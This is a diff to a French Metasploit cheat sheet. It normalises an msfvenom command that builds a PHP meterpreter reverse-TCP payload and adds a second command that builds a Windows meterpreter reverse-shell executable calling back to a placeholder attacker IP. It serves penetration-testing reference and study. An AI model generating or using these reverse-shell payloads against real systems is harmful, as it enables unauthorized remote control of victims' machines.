@@ -170,12 +170,17 @@ msf auxiliary(ssh_login) > sessions -u 1
 
 ## Payloads
 ### php (meterpreter)
-Pour créer un payload *php/meterpreter* en reverse tcp sur le port 4444 : 
+Pour créer un payload *php/meterpreter* en reverse tcp sur le port 4444 :
 ```
-# msfvenom -p php/meterpreter/reverse_tcp lhost=IP_KALI lport=4444 -f raw > payload.php
+# msfvenom -p php/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f raw > payload.php
+```
+### windows (meterpreter)
+```
+# msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > shell.exe
 ```
 
 ## Sources
 * https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf
 * https://www.ehacking.net/2011/11/how-to-use-openvas-in-metasploit.html
 * https://www.offensive-security.com/metasploit-unleashed/using-databases/
+* https://netsec.ws/?p=331
